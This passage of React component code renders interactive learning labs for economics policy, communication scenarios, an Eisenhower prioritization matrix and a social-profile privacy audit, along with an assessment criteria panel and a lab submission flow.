                    onClick={() => setFintechGeoVelocity(!fintechGeoVelocity)}
                    className="btn-outline"
                    style={{ height: '30px', padding: '0 10px', fontSize: '0.76rem', borderColor: fintechGeoVelocity ? 'var(--brand-primary)' : 'var(--border-subtle)' }}
                  >
                    {fintechGeoVelocity ? '✓ Velocity Guard Active' : '⚠ Guard Disabled'}
                  </button>
                </div>
              </div>

              {/* Robo-Advisory Risk Tolerance */}
              <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-canvas)', border: '1px solid var(--border-subtle)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                  <span style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--text-primary)' }}>
                    Robo-Advisory Portfolio Profile: {fintechRiskTolerance <= 2 ? 'Conservative' : fintechRiskTolerance === 3 ? 'Balanced Allocation' : 'Aggressive Growth'}
                  </span>
                  <span style={{ fontSize: '0.78rem', color: 'var(--brand-primary)', fontWeight: 800 }}>
                    Risk Level {fintechRiskTolerance} / 5
                  </span>
                </div>
                <input
                  type="range"
                  min="1"
                  max="5"
                  step="1"
                  value={fintechRiskTolerance}
                  onChange={(e) => setFintechRiskTolerance(parseInt(e.target.value))}
                  style={{ width: '100%' }}
                />
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB F5: Global Economics Simulation                      */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-f5-global-economics' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
                    Macroeconomic Policy Laboratory: Fiscal & Monetary Levers
                  </div>
                  <div style={{ fontSize: '0.84rem', color: 'var(--text-secondary)' }}>
                    Simulate real-time policy adjustments and balance the Taylor Rule with Okun's Law
                  </div>
                </div>
                <span className="badge" style={{ backgroundColor: 'var(--bg-surface-subdued)', color: econCalculations.regimeColor, fontWeight: 800 }}>
                  {econCalculations.regime}
                </span>
              </div>

              {/* Sliders Grid */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '16px' }}>
                <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-canvas)', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <span style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--text-primary)' }}>Central Bank Rate</span>
                    <strong style={{ fontSize: '0.82rem', color: 'var(--brand-primary)' }}>{econInterestRate}%</strong>
                  </div>
                  <input
                    type="range"
                    min="1.0"
                    max="12.0"
                    step="0.25"
                    value={econInterestRate}
                    onChange={(e) => setEconInterestRate(parseFloat(e.target.value))}
                    style={{ width: '100%' }}
                  />
                  <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', marginTop: '4px' }}>Monetary Tightening Levers</div>
                </div>

                <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-canvas)', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <span style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--text-primary)' }}>Corporate & Income Tax</span>
                    <strong style={{ fontSize: '0.82rem', color: 'var(--brand-primary)' }}>{econTaxRate}%</strong>
                  </div>
                  <input
                    type="range"
                    min="12"
                    max="45"
                    step="1"
                    value={econTaxRate}
                    onChange={(e) => setEconTaxRate(parseInt(e.target.value))}
                    style={{ width: '100%' }}
                  />
                  <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', marginTop: '4px' }}>Fiscal Revenue Levers</div>
                </div>

                <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-canvas)', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                    <span style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--text-primary)' }}>Capital Infrastructure</span>
                    <strong style={{ fontSize: '0.82rem', color: 'var(--brand-primary)' }}>${econGovSpending}B</strong>
                  </div>
                  <input
                    type="range"
                    min="20"
                    max="180"
                    step="5"
                    value={econGovSpending}
                    onChange={(e) => setEconGovSpending(parseInt(e.target.value))}
                    style={{ width: '100%' }}
                  />
                  <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', marginTop: '4px' }}>Fiscal Stimulus Multiplier</div>
                </div>
              </div>

              {/* Economic Indicators Readout */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '12px' }}>
                <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
                  <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--text-muted)' }}>ANNUAL INFLATION</div>
                  <div style={{ fontSize: '1.4rem', fontWeight: 800, color: econCalculations.inflation > 5.0 ? 'var(--danger)' : 'var(--text-primary)', margin: '4px 0' }}>
                    {econCalculations.inflation}%
                  </div>
                  <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>Target: 2.0% - 4.5%</div>
                </div>

                <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
                  <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--text-muted)' }}>REAL GDP GROWTH</div>
                  <div style={{ fontSize: '1.4rem', fontWeight: 800, color: econCalculations.gdp < 2.0 ? 'var(--warning)' : 'var(--brand-primary)', margin: '4px 0' }}>
                    +{econCalculations.gdp}%
                  </div>
                  <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>Target: &gt; 3.5%</div>
                </div>

                <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
                  <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--text-muted)' }}>UNEMPLOYMENT RATE</div>
                  <div style={{ fontSize: '1.4rem', fontWeight: 800, color: econCalculations.unemployment > 6.5 ? 'var(--danger)' : 'var(--text-primary)', margin: '4px 0' }}>
                    {econCalculations.unemployment}%
                  </div>
                  <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>Target: &lt; 5.5%</div>
                </div>
              </div>

              <div>
                <button
                  type="button"
                  onClick={handleApplyEconPolicy}
                  className="btn-primary"
                  style={{ height: '36px', padding: '0 18px', fontSize: '0.82rem' }}
                >
                  Apply & Evaluate Policy Outcomes
                </button>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB P1: Communication Pro Simulation                     */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-p1-communication-pro' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
                    Communication Pro: Executive Conflict & Active Listening Simulator
                  </div>
                  <div style={{ fontSize: '0.84rem', color: 'var(--text-secondary)' }}>
                    Navigate high-stakes team communication, stakeholder negotiations, and constructive reviews
                  </div>
                </div>
                <div style={{ display: 'flex', gap: '6px' }}>
                  {commScenarios.map((_, idx) => (
                    <button
                      key={idx}
                      type="button"
                      onClick={() => {
                        setCommScenarioIdx(idx);
                        setCommLastFeedback(null);
                      }}
                      className="btn-outline"
                      style={{
                        height: '28px',
                        padding: '0 10px',
                        fontSize: '0.74rem',
                        fontWeight: 700,
                        backgroundColor: commScenarioIdx === idx ? 'var(--brand-primary)' : undefined,
                        color: commScenarioIdx === idx ? '#FFFFFF' : undefined,
                      }}
                    >
                      Case {idx + 1}
                    </button>
                  ))}
                </div>
              </div>

              {/* Live Metric Gauges */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '10px' }}>
                {[
                  { label: 'Clarity', val: commScores.clarity },
                  { label: 'Listening', val: commScores.listening },
                  { label: 'Confidence', val: commScores.confidence },
                  { label: 'Respect', val: commScores.respect },
                ].map((item) => (
                  <div key={item.label} style={{ padding: '10px', borderRadius: '8px', backgroundColor: 'var(--bg-canvas)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
                    <div style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase' }}>{item.label}</div>
                    <div style={{ fontSize: '1.15rem', fontWeight: 800, color: item.val >= 70 ? 'var(--brand-primary)' : 'var(--text-primary)', margin: '2px 0' }}>
                      {item.val}%
                    </div>
                    <div style={{ width: '100%', height: '4px', backgroundColor: 'var(--border-subtle)', borderRadius: '100px', overflow: 'hidden' }}>
                      <div style={{ width: `${item.val}%`, height: '100%', backgroundColor: 'var(--brand-primary)' }} />
                    </div>
                  </div>
                ))}
              </div>

              {/* Scenario Context */}
              <div style={{ padding: '16px', borderRadius: '12px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)' }}>
                <div style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)', marginBottom: '4px' }}>
                  {commScenarios[commScenarioIdx].title}
                </div>
                <div style={{ fontSize: '0.84rem', color: 'var(--text-secondary)', lineHeight: 1.5, marginBottom: '16px' }}>
                  {commScenarios[commScenarioIdx].context}
                </div>

                <div style={{ fontSize: '0.8rem', fontWeight: 800, color: 'var(--brand-primary)', textTransform: 'uppercase', marginBottom: '8px' }}>
                  Select Your Communication Response:
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {commScenarios[commScenarioIdx].options.map((opt, oIdx) => (
                    <button
                      key={oIdx}
                      type="button"
                      onClick={() => handleSelectCommOption(oIdx)}
                      className="btn-outline"
                      style={{
                        textAlign: 'left',
                        padding: '12px 14px',
                        fontSize: '0.84rem',
                        lineHeight: 1.45,
                        borderRadius: '8px',
                        display: 'block',
                        whiteSpace: 'normal',
                        height: 'auto',
                      }}
                    >
                      {opt.text}
                    </button>
                  ))}
                </div>

                {commLastFeedback && (
                  <div style={{ marginTop: '14px', padding: '12px', borderRadius: '8px', backgroundColor: 'var(--bg-surface-subdued)', border: '1px solid var(--border-subtle)', fontSize: '0.82rem', color: 'var(--text-primary)', lineHeight: 1.5 }}>
                    <strong>Feedback Analysis:</strong> {commLastFeedback}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB P2: Professional Skills Simulation                   */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-p2-professional-skills' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
                    Professional Skills: Eisenhower Decision Matrix & Workplace Dilemmas
                  </div>
                  <div style={{ fontSize: '0.84rem', color: 'var(--text-secondary)' }}>
                    Master time prioritization, stakeholder diplomacy, and constructive performance models
                  </div>
                </div>
                <span className="badge badge-brand">EXECUTIVE SUITE</span>
              </div>

              {/* 2x2 Quadrant Grid */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
                {[
                  { q: 1, title: 'Q1: Urgent & Important', subtitle: 'Do Immediately (Critical Crises)', color: 'var(--danger)' },
                  { q: 2, title: 'Q2: Not Urgent, Important', subtitle: 'Schedule & Invest (Strategy & Growth)', color: 'var(--brand-primary)' },
                  { q: 3, title: 'Q3: Urgent, Not Important', subtitle: 'Delegate or Minimize (Interruptions)', color: 'var(--warning)' },
                  { q: 4, title: 'Q4: Not Urgent, Not Important', subtitle: 'Eliminate (Time Wasters)', color: 'var(--text-muted)' },
                ].map((quad) => (
                  <div
                    key={quad.q}
                    style={{
                      padding: '14px',
                      borderRadius: '10px',
                      backgroundColor: 'var(--bg-canvas)',
                      border: '1px solid var(--border-subtle)',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '8px',
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontSize: '0.82rem', fontWeight: 800, color: quad.color }}>{quad.title}</span>
                      <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>Quadrant {quad.q}</span>
                    </div>
                    <div style={{ fontSize: '0.74rem', color: 'var(--text-muted)' }}>{quad.subtitle}</div>
                    <div style={{ minHeight: '60px', display: 'flex', flexDirection: 'column', gap: '6px', marginTop: '6px' }}>
                      {skillsTasks.filter((t) => skillsPlacements[t.id] === quad.q).map((t) => (
                        <div key={t.id} style={{ padding: '6px 10px', borderRadius: '6px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)', fontSize: '0.78rem', color: 'var(--text-primary)' }}>
                          ✓ {t.text}
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>

              {/* Unplaced Tasks */}
              <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)' }}>
                <div style={{ fontSize: '0.82rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '8px' }}>
                  Assign Tasks into Matrix Quadrants:
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {skillsTasks.map((task) => (
                    <div key={task.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 12px', borderRadius: '8px', backgroundColor: 'var(--bg-canvas)', border: '1px solid var(--border-subtle)' }}>
                      <span style={{ fontSize: '0.82rem', color: 'var(--text-primary)' }}>{task.text}</span>
                      <div style={{ display: 'flex', gap: '4px' }}>
                        {[1, 2, 3, 4].map((qNum) => (
                          <button
                            key={qNum}
                            type="button"
                            onClick={() => handlePlaceTask(task.id, qNum)}
                            className="btn-outline"
                            style={{
                              height: '26px',
                              padding: '0 8px',
                              fontSize: '0.72rem',
                              backgroundColor: skillsPlacements[task.id] === qNum ? 'var(--brand-primary)' : undefined,
                              color: skillsPlacements[task.id] === qNum ? '#FFFFFF' : undefined,
                            }}
                          >
                            Q{qNum}
                          </button>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB P3: Social Profile & Digital Reputation Builder      */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-p3-social-profile' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
                    Social Profile & Executive Digital Reputation Studio
                  </div>
                  <div style={{ fontSize: '0.84rem', color: 'var(--text-secondary)' }}>
                    Optimize professional presence, portfolio artifacts, and privacy hygiene
                  </div>
                </div>
                <span className="badge badge-brand">
                  CREDIBILITY: {profileScores.credibility}/100
                </span>
              </div>

              {/* Profile Headline Builder */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--text-primary)' }}>
                  Professional Headline & Value Proposition:
                </label>
                <input
                  type="text"
                  value={profileHeadline}
                  onChange={(e) => setProfileHeadline(e.target.value)}
                  className="input-field"
                  style={{ width: '100%', height: '38px', borderRadius: '8px' }}
                />
              </div>

              {/* Bio Description */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--text-primary)' }}>
                  Executive Bio & Specializations:
                </label>
                <textarea
                  value={profileBio}
                  onChange={(e) => setProfileBio(e.target.value)}
                  className="input-field"
                  style={{ width: '100%', minHeight: '65px', borderRadius: '8px', padding: '10px' }}
                />
              </div>

              {/* Privacy & Safety Audit */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '10px' }}>
                <button
                  type="button"
                  onClick={() => setProfilePublicSearch(!profilePublicSearch)}
                  className="btn-outline"
                  style={{ padding: '10px', height: 'auto', textAlign: 'left', borderRadius: '8px' }}
                >
                  <div style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--text-primary)' }}>Search Indexing</div>
                  <div style={{ fontSize: '0.72rem', color: profilePublicSearch ? 'var(--brand-primary)' : 'var(--text-muted)' }}>
                    {profilePublicSearch ? '✓ Publicly Indexed' : 'Hidden from Search'}
                  </div>
                </button>

                <button
                  type="button"
                  onClick={() => setProfile2FA(!profile2FA)}
                  className="btn-outline"
                  style={{ padding: '10px', height: 'auto', textAlign: 'left', borderRadius: '8px' }}
                >
                  <div style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--text-primary)' }}>Two-Factor Auth</div>
                  <div style={{ fontSize: '0.72rem', color: profile2FA ? 'var(--brand-primary)' : 'var(--danger)' }}>
                    {profile2FA ? '✓ Hardware / App 2FA' : '⚠ Disabled (Risk)'}
                  </div>
                </button>

                <button
                  type="button"
                  onClick={() => setProfileTelemetry(!profileTelemetry)}
                  className="btn-outline"
                  style={{ padding: '10px', height: 'auto', textAlign: 'left', borderRadius: '8px' }}
                >
                  <div style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--text-primary)' }}>Third-Party Trackers</div>
                  <div style={{ fontSize: '0.72rem', color: !profileTelemetry ? 'var(--brand-primary)' : 'var(--warning)' }}>
                    {!profileTelemetry ? '✓ Trackers Blocked' : '⚠ Telemetry Allowed'}
                  </div>
                </button>
              </div>

              <div>
                <button
                  type="button"
                  onClick={handleAuditProfile}
                  className="btn-primary"
                  style={{ height: '36px', padding: '0 18px', fontSize: '0.82rem' }}
                >
                  Audit & Verify Digital Reputation Score
                </button>
              </div>
            </div>
          )}

          {/* Universal Domain Simulation Fallback */}
          {lab.id !== 'lab-t1-ai-classifier' &&
            lab.id !== 'lab-t2-blockchain-builder' &&
            lab.id !== 'lab-t3-iot-sensor' &&
            lab.id !== 'lab-t4-privacy-decision' &&
            lab.id !== 'lab-t5-web-defense' &&
            lab.id !== 'lab-t6-microsoft-productivity' &&
            lab.id !== 'lab-f1-market-explorer' &&
            lab.id !== 'lab-f2-compound-interest' &&
            lab.id !== 'lab-f3-institution-flow' &&
            lab.id !== 'lab-c1-programming-fundamentals' &&
            lab.id !== 'lab-c2-conditions-loops' &&
            lab.id !== 'lab-c3-debugging-workshop' &&
            lab.id !== 'lab-sec-scam-defense' &&
            lab.id !== 'lab-t7-trustlink-blockchain' &&
            lab.id !== 'lab-f4-fintech-discovery' &&
            lab.id !== 'lab-f5-global-economics' &&
            lab.id !== 'lab-p1-communication-pro' &&
            lab.id !== 'lab-p2-professional-skills' &&
            lab.id !== 'lab-p3-social-profile' && (
              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                  Interactive Domain Simulation Studio
                </div>
                {lab.category === 'finance' && <BudgetPieSvg income={5000} />}
                {lab.category === 'professional' && <ConversationSvg currentStep={2} />}
                {lab.category === 'technology' && <ClassroomSvg currentStep={2} />}
                {lab.category === 'coding' && (
                  <MarketTrendSvg scenario="expansion" beta={1.0} />
                )}
              </div>
            )}
            </>
          )}
        </section>

        {/* ============================================================ */}
        {/* PANEL 3 (RIGHT): OUTPUT, CRITERIA & SUBMISSION VERIFICATION  */}
        {/* ============================================================ */}
        {workspaceMode === '3-column' && (
          <aside
            className={`workspace-panel-criteria ${mobileTab === 'results' ? 'active' : ''}`}
            style={{
              backgroundColor: 'var(--bg-surface)',
              borderLeft: '1px solid var(--border-subtle)',
              padding: '16px',
              display: 'flex',
              flexDirection: 'column',
              gap: '14px',
            }}
          >
          {/* Status Badge Card */}
          <div
            style={{
              padding: '14px',
              borderRadius: '8px',
              backgroundColor:
                lifecycleState === 'success'
                  ? 'var(--success-bg)'
                  : lifecycleState === 'running'
                  ? 'var(--brand-surface)'
                  : 'var(--bg-surface-subdued)',
              border:
                lifecycleState === 'success'
                  ? '1px solid var(--success-border)'
                  : lifecycleState === 'running'
                  ? '1px solid var(--brand-border)'
                  : '1px solid var(--border-subtle)',
            }}
          >
            <div style={{ fontSize: '0.72rem', fontWeight: 800, textTransform: 'uppercase', letterSpacing: '0.04em', color: 'var(--text-secondary)' }}>
              LAB STATUS
            </div>
            <div
              style={{
                fontSize: '1.05rem',
                fontWeight: 800,
                color:
                  lifecycleState === 'success'
                    ? 'var(--success)'
                    : lifecycleState === 'running'
                    ? 'var(--brand-primary)'
                    : 'var(--text-primary)',
                textTransform: 'uppercase',
              }}
            >
              {lifecycleState === 'success' ? '✓ Mastered' : lifecycleState}
            </div>
          </div>

          {/* Validation Checklist */}
          <div>
            <div style={{ fontSize: '0.75rem', fontWeight: 800, color: 'var(--text-primary)', letterSpacing: '0.05em', textTransform: 'uppercase', marginBottom: '12px' }}>
              ASSESSMENT CRITERIA
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              {lab.validation_criteria.map((crit, idx) => {
                const isMet = checkedCriteria[idx];
                return (
                  <div
                    key={idx}
                    style={{
                      display: 'flex',
                      alignItems: 'flex-start',
                      gap: '10px',
                      fontSize: '0.84rem',
                      color: isMet ? 'var(--text-primary)' : 'var(--text-muted)',
                      lineHeight: 1.45,
                    }}
                  >
                    <div
                      style={{
                        width: '18px',
                        height: '18px',
                        borderRadius: '4px',
                        backgroundColor: isMet ? 'var(--success-bg)' : 'var(--bg-surface-subdued)',
                        border: isMet ? '1px solid var(--success-border)' : '1px solid var(--border-strong)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        color: isMet ? 'var(--success)' : 'transparent',
                        flexShrink: 0,
                        marginTop: '2px',
                      }}
                    >
                      <CheckCircle2 size={12} />
                    </div>
                    <span>{crit}</span>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Submission and Persistent Progress Recording */}
          <div style={{ marginTop: 'auto', paddingTop: '16px', borderTop: '1px solid var(--border-subtle)', display: 'flex', flexDirection: 'column', gap: '10px' }}>
            <button
              type="button"
              onClick={handleSubmitAttempt}
              className="btn-primary"
              style={{ width: '100%', height: '42px', fontSize: '0.92rem' }}
            >
              <Award size={16} />
              <span>Submit & Record Progress</span>
            </button>

            {completedAttempt && (
              <div
                style={{
                  padding: '12px',
                  borderRadius: '6px',
                  backgroundColor: 'var(--success-bg)',
                  border: '1px solid var(--success-border)',
                  color: 'var(--success)',
                  fontSize: '0.78rem',
                  lineHeight: 1.45,
                }}
              >
                <div style={{ fontWeight: 700, marginBottom: '2px' }}>✓ Progress Authoritatively Recorded</div>
                <div>Attempt #{completedAttempt.attempt_number} • Score: {completedAttempt.score}/100 • +100 XP Awarded</div>
              </div>
            )}
          </div>
        </aside>
      )}
      </main>

      {/* FULL STANDALONE INTERACTIVE LAB MODAL OVERLAYS */}
      {activeFullLab && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            zIndex: 9999,
            backgroundColor: '#070B19',
            display: 'flex',
            flexDirection: 'column',
          }}
        >
          {(() => {
            const currentStandalone = getStandaloneLab(activeFullLab) || standaloneLabMeta;
            const labName = currentStandalone?.name || lab.title || 'Interactive Lab';
            return (
              <LabErrorBoundary labName={labName} onClose={() => setActiveFullLab(null)}>
                {currentStandalone ? (
                  React.createElement(currentStandalone.component, {
                    onClose: () => setActiveFullLab(null),
                    onExit: () => setActiveFullLab(null),
                  })
                ) : (
                  <UniversalLab simulationId={lab.id} onClose={() => setActiveFullLab(null)} />
                )}
              </LabErrorBoundary>
            );
          })()}
        </div>
      )}
    </div>
    </LabOrientationGuard>
  );
};
